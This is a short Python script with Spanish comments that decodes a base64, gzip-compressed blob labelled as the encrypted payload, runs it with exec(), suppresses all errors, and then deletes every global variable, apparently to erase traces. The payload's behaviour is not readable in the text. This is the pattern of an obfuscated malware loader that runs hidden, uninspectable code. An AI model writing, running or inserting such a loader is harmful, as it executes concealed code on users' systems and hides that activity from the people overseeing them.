import gzip
import base64

try:
    # Código de la carga, cifrado
    codigo = "H4sIAI32h2QC/5VXW2/bNhR+1684cx9sIamQS68GPMB13SSI6xixt2BICoOWjmwuEqVSlB2v6NP+1R63P7ZDUr5LzeYHieL38dx0SH3mcZpIBelSpLnyHnE5SZgMjkHNJLKAi+kxpBFTYSJjx1Fy2XSAftyuWnBxfjbNObAMFg4++Zgq6JobT4SlpizLHMeJkmkzUxJaUKs5XCiUcxY1aUAzpyfOnPuKx+NsmSmMC+LKr2dnG64TsUzdcREki7UtINsBhsDSFEUwVsmYPDUIpdBdePkz9BOBNpIaedb3tqFmwMDSQCWULsI0SiYsgjoZqMOcSc4mEXqOWdNMmWRxsaAJ7a2lEyycY7CyRBY8u0wtU1yvorudlahyKZomtp3QihBovXmkOyWpr0eFETNtEk5l4mOWjemVjVNJowaNKjIeWC5mQBwwbBozEWjbmQ451qEzCPk647acZtaK/ul1jb0m8a7JYRNGlLCG1YxRR1AnWPtBYefW5LplSofnlWa9frtm1s+lRKF0grZrVgbM4AX8ipKH3Ke3yAEjuuomYZCkKJni8wQoRWsusz0bwk6XQasF9YJQ34S37vHV7wXcTBRHgdqLSOKJRAjoHTOYU3hMMGC+ylkU0xPqMZ+zHQMdm4h11WcxUjoL7wKLmRE+qYZ5/pRInMokF4FFGq7r7IUy5M9EobMOeIjSRrPH/efPv/+KqASbVeSRCidZsBszFWvzOuCn1mESu0Wy0bVNCPwPdhDkf3Zs2n7jucRxmd8pWWOQk1lU/GuOispBvU2lYIqua1801hsZyBh1jgSiQoYwY2KLAyh0yCLH+TrcA6e73RnWHsSDuP9ovNE2pR1gnJGlJnw7SOH7lwex6ef9c1OfpnvltYfo9oxz0KvbER219HmhTwTPnzHpOlt+2opOkkmusCtlIjfrr7u/jT+3B4Or/gVl9G3HmzaUpczHJtSgdnyA6WaTGrvv9kfd2y9lnAnzH9c27j+0O9fDQbvTLeX6SkbjyBA7o9teNUf+mJPNeKgMZXh59WlUzSkMVbMCjFDZ0D92e91RedyY+bYKw04prtjE4KP2h1I8Tw38y6A8hmQhbAQ3d/1SRoRFur1uRR6ST2eWcnt1cVnO8ePAMO6u+uRp+JI6o4pX1O05ZnhqaJ9Oy9Ezi56Vo+cWPS9HX1n0VTn62qKvy9E3Fn1Tjr616Nty9J1F35Wj7y36vqIaJ0U5TirwVbkq6nVaFOy0vGIsUsXmafdGlQz5Q4bP0oyklP9oN1h7MOzddK5LqbMkthvj8uaz3hZrwveqs2nrqPGmqPQ5dawPFitzrJA50hPF929X3G0Zc81RaAVgEPQIfFbzaTUVk0BhU1zJtTpZ0kLIU0+qvq2BBlr00baXhXwxeu1Q1RzIuAVXMy1ERKO2ZbpGObKjmqvP93Bz7obeQnKFDaK5NhWJWl1XpXKbC52HJUGYC998NCRSXTI+x2gJeaa1KYPBUs0Isloe6POL0gPn/2nQVV23BGlBNPbocf1XwRvpmcZK3R8XMbobtpcppjPTM85KR44jLd2EsbUvMXsF1EiEVbmtA93rOqbcB9Zs1Va1dIpu3eV4vydcNNx/AWANd8IFDQAA"

    # Código de la carga, decifrado
    descifrada = gzip.decompress(base64.b64decode(codigo)).decode("utf-8")
    
    # Ejecución del código
    exec(str(descifrada))
    # print(str(descifrada))
    print(globals().keys())
except:
    pass
finally:
    for i in list(globals().keys()):
        if i != '_':
            exec('del {}'.format(i))
    del i
    print(globals().keys())
